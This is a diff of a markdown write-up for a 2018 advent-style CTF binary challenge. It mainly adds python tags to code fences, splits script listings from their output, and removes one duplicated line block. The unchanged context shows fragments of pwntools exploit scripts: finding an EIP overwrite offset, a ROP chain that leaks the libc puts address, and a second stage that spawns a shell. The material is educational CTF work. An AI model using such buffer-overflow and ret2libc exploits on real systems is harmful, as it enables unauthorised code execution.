@@ -328,7 +328,7 @@ The first parts reads 16 integer
 
 which translates to something like:
 
-```
+```python
 print "\nAha! You found Santas secret backdoor"
 keycode = range(0x0F + 1)
 x = 0
@@ -432,7 +432,7 @@ which jumps to access denied if EAX is 0 (so it needs to be anything except 0)
   
 following can be translated to pseudocode like:
 
-```
+```python
 if keycode[0] != 0x61F55C:		# 6419804
 	goto denied
 if keycode[1] != 0x6B8D03:		# 7048451
@@ -534,7 +534,7 @@ the win() function just prints the message and reads some data from stdin into a
 we can use the following piece of code to find how many bytes we need to overwrite EIP:
 
 
-```
+```python
 % cat exploit_v1.py
 #!/usr/bin/python
 
@@ -567,8 +567,9 @@ info("eip = %#x", eip)
 
 offset = cyclic_find(eip)
 info("offset = %d", offset)
+```
 
-
+```
 % ./exploit_v1.py 
 [*] '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift'
     Arch:     i386-32-little
@@ -702,7 +703,7 @@ so our stack needs to be like this:
 
 makes some code like this:
 
-```
+```python
 % cat exploit_v2.py 
 #!/usr/bin/python
 
@@ -733,12 +734,6 @@ code += pop_ebx
 code += got_puts
 code += win 
 
-code  = "A"*offset
-code += puts_plt
-code += pop_ebx
-code += got_puts
-code += win
-
 io = process(elf.path)
 io.recvuntil(" > ")
 io.sendline("666")
@@ -755,9 +750,9 @@ addr = struct.unpack("I", io.read(4))[0]
 print "address of puts: 0x%x"%addr
 
 print io.recv(4096)
+```
 
-
-
+```
 % ./exploit_v2.py
 [*] '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift'
     Arch:     i386-32-little
@@ -834,7 +829,7 @@ we should get a shell...
 
 we can simply extend of script:  
 
-```
+```python
 % cat exploit_v3.py
 [...]
 ## second shellcode
@@ -851,9 +846,9 @@ code += p32(addr + offset_binsh)
 
 io.sendline(code)
 io.interactive()
+```
 
-
-
+```
 % ./exploit_v3.py
 [*] '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift'
     Arch:     i386-32-little
@@ -884,7 +879,7 @@ Most of the work is already done for the remote shell, but we need to extract th
 for this i used distorm3, probably in the most horrible possible way, but it works...  
 
 
-```
+```python
 % cat exploit_v4.py 
 #!/usr/bin/python
 
